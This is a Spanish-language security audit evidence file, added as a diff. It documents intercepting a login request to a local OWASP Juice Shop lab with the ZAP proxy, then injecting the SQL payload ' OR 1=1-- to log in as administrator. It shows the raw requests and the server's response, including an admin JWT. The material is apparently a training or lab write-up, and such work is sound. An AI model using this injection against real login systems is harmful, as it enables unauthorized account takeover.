@@ -1,0 +1,45 @@
+================================================================================
+EVIDENCIA TÉCNICA 4: INTERCEPCIÓN Y MANIPULACIÓN CON BREAKPOINT (OWASP ZAP MitM)
+Metodología: Intercepción de petición HTTP antes de llegar al backend, alteración de parámetros y reenvío.
+Fecha de Auditoría: 2026-10-28 18:21:54 UTC
+================================================================================
+
+[PASO 1: PETICIÓN ORIGINAL GENERADA POR EL NAVEGADOR DEL CLIENTE]
+POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Content-Type: application/json
+Content-Length: 54
+
+{"email": "student_02@universidad.es", "password": "UserPass123!"}
+
+[PASO 2: INTERCEPCIÓN EN PROXY OWASP ZAP (ESTADO BREAKPOINT ACTIVO)]
+El proxy retiene la petición. El auditor modifica el cuerpo (payload) para forzar autenticación como Administrador.
+
+[PASO 3: PETICIÓN MANIPULADA REENVIADA AL SERVIDOR VULNAWEB]
+POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Content-Type: application/json
+Content-Length: 40
+
+{"email": "' OR 1=1--", "password": "a"}
+
+[PASO 4: RESPUESTA OBTENIDA DEL SERVIDOR TRAS MANIPULACIÓN]
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: application/json; charset=utf-8
+Content-Length: 784
+ETag: W/"310-CPKP4iDuz96c7K0V4n/qZmzz0uU"
+Vary: Accept-Encoding
+Date: Wed, 28 Oct 2026 17:21:54 GMT
+Connection: close
+
+{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yOCAxNzoyMTozNS41NDUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yOCAxNzoyMTozNS41NDUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMyMDgxMTR9.WsYp6xWxfC3FF5BfA6TpiwsR2rGl8i-hxY4GKijo-PbqwF6hlsuj_R89uGGOkPbX0szVH3nelmzP6C2YxFBCD5AQgcldg84t-ZERHiRhqyQ9soB_saITOSl_kaKceauJscsVOaN2BCwRPF9p20vGZ_TMfp0ofQRgqghigpvV3hc","bid":1,"umail":"admin@juice-sh.op"}}
+
+[+] RESULTADO: Autenticacion exitosa como usuario 'admin@juice-sh.op' sin conocer la contrasena.
+    Se emite JSON Web Token (JWT) con privilegios de Administrador del sistema.
